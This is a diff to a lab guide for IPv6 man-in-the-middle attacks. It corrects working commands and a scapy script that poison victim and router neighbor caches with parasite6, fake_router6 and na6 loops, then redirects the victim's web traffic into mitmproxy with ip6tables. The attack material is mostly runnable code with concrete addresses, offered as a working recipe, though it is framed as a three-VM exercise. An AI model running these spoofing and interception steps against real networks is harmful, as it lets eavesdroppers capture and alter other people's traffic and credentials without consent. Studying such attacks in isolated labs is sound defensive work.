@@ -15,7 +15,7 @@ IPv6 man-in-the-middle (MITM) attacks exploit the Neighbor Discovery Protocol (N
 ```text
 [Attacker VM]     [Victim VM]      [Router/Gateway]
 192.168.1.100     192.168.1.10     192.168.1.1
-2001:db8::attacker  2001:db8::victim  2001:db8::router
+2001:db8::100     2001:db8::10     2001:db8::1
 ```
 
 All three VMs should be on the same network segment (e.g., a private virtual switch).
@@ -27,32 +27,42 @@ All three VMs should be on the same network segment (e.g., a private virtual swi
 
 sudo sysctl -w net.ipv6.conf.all.forwarding=1
 
-# Poison victim's NDP cache (tells victim: gateway = attacker's MAC)
-sudo parasite6 eth0 2001:db8::victim &
+# Listen for Neighbor Solicitations and reply with the attacker's MAC
+sudo parasite6 -l eth0 &
 
-# Poison gateway's NDP cache (tells gateway: victim = attacker's MAC)
-sudo fake_router6 eth0 2001:db8::/64 &
+# Optionally advertise the attacker as a rogue default router on the lab segment
+sudo fake_router6 eth0 2001:db8::/64 2001:db8::1 &
 ```
 
 ## Method 2: NDP Spoofing with na6 (SI6 Networks)
 
 ```bash
 # Enable forwarding
-sudo sysctl -w net.ipv6.conf.eth0.forwarding=1
+sudo sysctl -w net.ipv6.conf.all.forwarding=1
+
+ATTACKER_MAC=$(cat /sys/class/net/eth0/address)
 
 # Tell victim the gateway's address resolves to our MAC
-sudo na6 -i eth0 \
-  -s 2001:db8::router \
-  -d 2001:db8::victim \
-  --override \
-  --loop --sleep 3 &
+while true; do
+  sudo na6 -i eth0 \
+    -s 2001:db8::1 \
+    -d 2001:db8::10 \
+    -t 2001:db8::1 \
+    -S "$ATTACKER_MAC" \
+    -r -o -e
+  sleep 3
+done &
 
 # Tell router the victim's address resolves to our MAC
-sudo na6 -i eth0 \
-  -s 2001:db8::victim \
-  -d 2001:db8::router \
-  --override \
-  --loop --sleep 3 &
+while true; do
+  sudo na6 -i eth0 \
+    -s 2001:db8::10 \
+    -d 2001:db8::1 \
+    -t 2001:db8::10 \
+    -S "$ATTACKER_MAC" \
+    -o -e
+  sleep 3
+done &
 ```
 
 ## Method 3: scapy-based NDP Poisoning
@@ -60,11 +70,12 @@ sudo na6 -i eth0 \
 ```python
 from scapy.all import *
 from scapy.layers.inet6 import *
+import time
 
 iface = "eth0"
 attacker_mac = get_if_hwaddr(iface)
-victim = "2001:db8::victim"
-gateway = "2001:db8::router"
+victim = "2001:db8::10"
+gateway = "2001:db8::1"
 
 def poison():
     # Tell victim: gateway is at attacker's MAC
@@ -77,7 +88,7 @@ def poison():
            ICMPv6ND_NA(tgt=victim, R=0, S=0, O=1) / \
            ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)
 
-    send([pkt1, pkt2], iface=iface, verbose=0)
+    send([pkt1, pkt2], verbose=0)
 
 # Poison continuously
 while True:
@@ -93,10 +104,10 @@ Once MITM is established, traffic flows through the attacker:
 # View intercepted traffic with tcpdump
 sudo tcpdump -i eth0 -n ip6 and not icmp6
 
-# Intercept with mitmproxy (for HTTP/HTTPS)
-sudo mitmproxy --mode transparent --listen-port 8080
+# Intercept with mitmproxy (HTTP; transparent HTTPS additionally requires the mitmproxy CA on the test client)
+sudo mitmproxy --mode transparent --showhost --listen-port 8080
 
-# Redirect victim's web traffic through mitmproxy
+# Redirect victim's HTTP traffic through mitmproxy
 sudo ip6tables -t nat -A PREROUTING \
   -p tcp --dport 80 \
   -j REDIRECT --to-port 8080
@@ -109,9 +120,9 @@ sudo ip6tables -t nat -A PREROUTING \
 ip -6 neigh show
 # Should show gateway's IPv6 address mapped to attacker's MAC
 
-# On attacker: verify traffic is passing through
-ip -6 route show
-netstat -s | grep forward
+# On attacker: verify packets are traversing the MITM host
+sudo tcpdump -i eth0 -n ip6 and not icmp6
+netstat -s | grep -i forwarded
 ```
 
 ## Cleaning Up the Lab
